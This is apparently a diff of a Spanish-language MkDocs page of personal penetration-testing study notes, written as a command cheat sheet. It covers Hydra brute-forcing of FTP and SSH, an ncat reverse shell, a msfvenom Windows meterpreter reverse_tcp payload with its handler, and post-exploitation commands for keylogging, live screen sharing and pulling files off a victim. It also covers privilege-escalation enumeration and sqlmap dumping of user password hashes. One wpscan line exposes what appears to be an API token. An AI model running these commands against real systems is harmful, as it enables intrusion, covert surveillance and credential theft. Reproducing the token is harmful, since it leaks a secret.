+<p>Vuelve a iniciar un nuevo contenedor de docker</p>
+<p>docker port [nombre]</p>
+<p>docker port myWebServer</p>
+<p>Con port te dice qué puertos de tu máquina real (host) están conectados a los puertos del contenedor.</p>
+<p>docker run -dit -p [puerto] -v [direccion nativo]:[direccion contenedor] --name [nombre] [imagen]</p>
+<p>docker run -dit -p 80:80 -v /home/fabca06/Escritorio/Apuntes_Hacking/Introduccion_Hacking/docker/:/var/www/html/ --name myWebServer ubuntu_image</p>
+<p>Creas un montaje con -v, es basicamente un puente donde tu archivo del contenedor se sincroniza con el archivo de tu nativo y los datos estan guardados en los 2, en tiempo real</p>
+<p>docker logs [nombre] -f</p>
+<p>docker logs myWebServer -f</p>
+<p>Checa los logs que te lanza docker del contenedor, puedes poner -f para actualizar en tiempo real los logs</p>
+<p>docker port [nombre]</p>
+<p>docker port myWebServer</p>
+<p>Checa el puerto de un contenedor</p>
+<p>docker volume ls</p>
+<p>Gestiona los volumenes de almacenamiento creados</p>
+<h2 id="enumeracion-de-servicio">Enumeracion de servicio</h2>
+<p>ftp [direccion IP]</p>
+<p>ftp (127.0.0.1)(localhost)</p>
+<p>Protocolo FTP (File Transfer Protocol)</p>
+<p>hydra -l [nombre] -P [ruta diccionario] [ruta servicio] -t [n.º de hilos]</p>
+<p>hydra -l fabca06 -P /usr/share/wordlists/rockyou.txt ftp://127.0.0.1 -t 15</p>
+<p>hydra -l fabca06 -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 2223 -t 15 -vV</p>
+<p>Usa Hydra para realizar ataques de fuerza bruta, con -l indicas el login mientras que con -P la ruta donde esta la lista de las contraseñas a probar, ya despues pones la ruta del servicio, con -t los hilos, con -s especificas el puerto a usar, -v para verbose y -V para mostrar para usuario y contraseña usandose</p>
+<p>openssl s_client -connect [ruta]:[puerto]</p>
+<p>openssl s_client -connect tinder.com:443</p>
+<p>Herramienta para analizar paginas.Con s_clientindicas conexiones TLS/SSL, con connect Indica la dirección, pones ruta y puerto. openssl solo analiza la informacion obtenida de una conexión pero da informacion del certificado y el algoritmo de cifrado con tu equipo</p>
+<p>sslscan [ruta]</p>
+<p>sslscan tinder.com</p>
+<p>A diferencia de openssl, sslscan analiza varias conexiones, obteniendo lista de versiones de SSL y TLS que se usa, todos los algoritmos de cifrado que acepta, y vulnerabilidades famosas</p>
+<p>python3 ssltest.py 127.0.0.1 -p 8443 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"</p>
+<p>Envia paquetes de datos en hexadecimal, para comprobar la vulnerabilidad de Heartbleed. La vulerabilidad es basicamente rellenar los datos con contenido aleatorio para que pese con los datos solicitados</p>
+<p>smbclient -L 127.0.0.1 -N</p>
+<p>smbclient //127.0.0.1/myshare -N</p>
+<p>Realiza pruebas a un servidor como cliente con el protocolo SMB, dirigiendolo a una direccion y con -N registrarse como anonimo y sin contraseña. Ya despues te puedes conectar al servicio</p>
+<p>crackmapexec smb 127.0.0.1</p>
+<p>Enumeracion de SMB, revisando si estaba abierto puerto 445, analizaje de metadatos, nombre Hostname, version de SO, verifica si el servidor exige firmas digitales en los paquetes de red</p>
+<p>searchsploit [tecnologia] [vulnerabilidad]</p>
+<p>searchsploit wordpress user enumeration</p>
+<p>Busca si hay una vulnerabilidad para la tecnologia aplicada</p>
+<p>searchsploit -x php/webapps/41497.php;</p>
+<p>Con -x y pasando la ruta analizas el codigo del script con la vulnerabilidad</p>
+<p>wpscan --url http://127.0.0.1:31337 -e vp,u --api-token [token]</p>
+<p>escaneo de vulnerabilidades esclusivo de WordPress, usa -e para enumerar vulnerabilidades (vp) y usuarios (u). WordPress no pasa toda la informacion de golpe, pues</p>
+<p>wpscan --url http://127.0.0.1:31337/ --random-user-agent --detection-mode aggressive --enumerate u,ap,at,cb,dbe --plugins-detection aggressive --plugins-version-detection aggressive --themes-detection aggressive --api-token "aca tu api token" --format cli --api-token 'GgqZdnqLTswWu8P3s8UdkmwDgLFG8P5dBBpZRcisgME'</p>
+<p>Escaneo completo. Con –random-user-agent cambia la identidad aleatoriamente, con --detection-mode aggressive haces escaneo masivo, en el -e tambien esta ap para todos los plugins, at para todas plantillas visuales, cb para copas de seguridad, dbe para bases de datos expuestos, y esta –formatcli para optimizar resultados</p>
+<p>perl joomscan.pl -u http://localhost:8080</p>
+<p>Enumeracion para Joomla, especificando direccion con -u</p>
+<p>magescan.phar scan:all http://127.0.0.1:8080</p>
+<p>Escaneo para Magescan</p>
+<h2 id="payloads-con-ncat-y-meterpreter">Payloads con Ncat y Meterpreter</h2>
+<p>ncat -e /bin/bash 127.17.0.1 443</p>
+<p>Escucha a otro dispositivo</p>
+<p>rlwrap nc -nlvp</p>
+<p>Escucha desde otro dispositivo, con rlwrap sirve de complemento para limpiar pantalla con Control L, asi como otros</p>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.97 LPORT=4646 -f exe -o reverse.exe</p>
+<p>Generacion de payloads, con -p defines el payload que en este caso sera para windows de 64 bits, la shell a usar como meterpreter, el tipo de conection en reverse_tcp osea reverse shell, ahora pones la IP de la victima y un puerto para escuchar, ya de ahi con -f creas un tipo de ejecutable, en este caso para Windows, y con -o el nombre del script</p>
+<p>sudo msfdb run</p>
+<p>use exploit/multi/handler</p>
+<p>set PAYLOAD windows/x64/meterpreter/reverse_tcp</p>
+<p>set LHOST 192.168.100.75</p>
+<p>set LPORT 4646</p>
+<p>run</p>
+<p>tras crear el .exe con msfvenom, usas msfdb run que ya es un programa dedicado a comprometer el dispositivo, mencionando el mismo payload, mencionando tu propia IP y puerto para la escucha, ya de ahi run y esperas a que la victima abra el .exe para comprometer la PC</p>
+<p>background</p>
+<p>Lleva a una sesion a segundo plano</p>
+<p>sessions -K</p>
+<p>Cierra todas las sesiones de golpe</p>
+<p>sessions -u [ID]</p>
+<p>Actualiza automaticamente una sesion de cmd a shell de meterpreter</p>
+<p>sessions -c “[comando]”</p>
+<p>Ejecuta un comando en todas las sesiones al mismo tiempo</p>
+<p>sessions -i [ID]</p>
+<p>Si pusiste una sesion en segundo plano, puedes volver con su ID</p>
+<p>search [palabra clave]search post/windows/gather</p>
+<p>Busca modulos especificos en la base de datos, como post/windows/gather</p>
+<p>info [modulo]</p>
+<p>Checa informacion de un modulo</p>
+<p>options/show options</p>
+<p>Muestra variables necesarias para configurar (Ips, puertos, rutas) antes de lanzar el modulo</p>
+<p>use post/windows/gather/enum_patches</p>
+<p>Revisa actualizaciones de seguridad de Microsoft importantes que faltan a la maquina virtual</p>
+<p>use post/windows/gather/checkvm</p>
+<p>Analiza hardware y controladores para determinar si la victima es maquina fisica o virtual</p>
+<p>use post/windows/gather/enum_applications</p>
+<p>Genera lista completa del software instalado en sistema de la victima</p>
+<p>jobs</p>
+<p>Checa los procesos corriendo en el sistema</p>
+<p>spool [ruta archivo].txt</p>
+<p>Toda la informacion de log la puedes guardar dentro de un archvo</p>
+<p>makerc [ruta archvo].rc</p>
+<p>Guarda todos los comandos escritos en un script</p>
+<p>msfconsole -r [ruto archivo].rc</p>
+<p>Ejecuta todo el script guardado</p>
+<h2 id="101-comandos-dentro-de-sesion-activa-de-meterpreter">10.1 Comandos dentro de sesion activa de Meterpreter</h2>
+<p>ls</p>
+<p>Listar archivos y carpetas</p>
+<p>cd [ruta]</p>
+<p>Cambio de directorio</p>
+<p>pwd</p>
+<p>Mostrar ruta exacta</p>
+<p>cat [archivo]</p>
+<p>Mostrar contenido de un archivo</p>
+<p>download [ruta]</p>
+<p>download "C:\Users\marai\Documents\nota.txt"</p>
+<p>Descarga un archivo de la maquina victima al atacante</p>
+<p>upload [ruta_local]</p>
+<p>Sube un archivo desde maquina atacante a la victima</p>
+<p>search -f [nombre]</p>
+<p>Busca archivos en el sistema</p>
+<p>sysinfo</p>
+<p>Mostrar detalles tecnicos de la maquina</p>
+<p>getuid</p>
+<p>Nombre del usuario de la maquina victima</p>
+<p>ps</p>
+<p>Lista todos los programas y procesos ejecutandose</p>
+<p>migrate [PID]</p>
+<p>Muda el proceso de Meterpreter a otro programa en ejecucion</p>
+<p>shell</p>
+<p>Abre una consola de windows cmd, ejecutando comandos nativos</p>
+<p>netstat</p>
+<p>Mostrar conexiones de red activas de la victima</p>
+<p>ipconfig/ifconfig</p>
+<p>Mostrar interfaces de red de la maquina y direcciones IP asignadas</p>
+<p>arp</p>
+<p>Mostrar tabla ARP, permitiendo ver otros dispositivos e Ips locales</p>
+<p>screenshot</p>
+<p>Toma captura estatica de lo que el usuario ve en el monitor</p>
+<p>screenshare</p>
+<p>Inicia transmision en tiempo real por medio de navegador web</p>
+<p>keyscan_start</p>
+<p>Registra en silencio las teclas que el usuario presione en el teclado</p>
+<p>keyscan_dump</p>
+<p>Mira el texto que el usuario ha escrito desde que se inicio el escaneo</p>
+<p>keyscan_stop</p>
+<p>Detener registro del teclado</p>
+<h2 id="enumeracion-de-sistema-con-lse">Enumeracion de sistema con lse</h2>
+<p>./lse.sh</p>
+<p>Ejecuta el script, que es un enumeracion inteligete buscando de varias maneras como escalar privilegios</p>
+<p>./lse.sh -l 2;</p>
+<p>Con -l 2, puedes hacer que te de informacion mas especifica cuando en un escaneo especifico haya encontrado resultados esperados que puedan convertirte en root</p>
+<p>./LinEnum.sh</p>
+<p>Ejecuta el script, que es un enumeracion inteligete buscando de varias maneras como escalar privilegios</p>
+<p>systemctl list-timers</p>
+<p>Checa tareas CRON, cuanto tiempo falta para ejecutarse, incluyendo tareas del sistema</p>
+<p>cat /etc/crontab</p>
+<p>Lista de todos las tareas CRON</p>
+<p>getcap -r / 2&gt;dev/null</p>
+<p>Checa todas las capability y que tienen en especifico</p>
+<p>ps</p>
+<p>Checa procesos que se ejecuten por ti mismo y creados de la misma terminal</p>
+<p>ps -eo command</p>
+<p>Con -e especificas todos los procesos del sistema, con -o especificas que solo muestre columna especifica, en este caso el comando como tal</p>
+<h2 id="vulnerabilidad-sql-injection">Vulnerabilidad SQL Injection</h2>
+<p>sqlmap -r request.req -p searchitem --batch -D sqlitraining --tables</p>
+<p>Explota vulnerabilidades de SQL con SQLMap, donde con -r especificas leer una peticion HTTP guardada en un archivo de texto, con -p especificas a que parametro unicamente quieres inyectar SQLI, con --batch es no preguntar nada, que tome decisiones por su propia cuenta, con -D especificas la base de datos que quieres apuntar, y con --tables es enumerar y mostrar las tablas adentro en caso de encontrarlos</p>
+<p>sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users --columns;</p>
+<p>Una vez enumerado la base de datos, puededs usar -T para revisar una tabla en especifica y luego enumerar las columnas para ver las variables</p>
+<p>sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users -C username,password --dump;</p>
+<p>Despues, una vez vista las columnas puedes dumpearlas para ver los campos especificados con -C (usuario y contraseña), y especificando --dump para mostrar los Hashes tambien</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.f1b6f286.min.js"></script>
+      
+    
+  </body>
+</html>
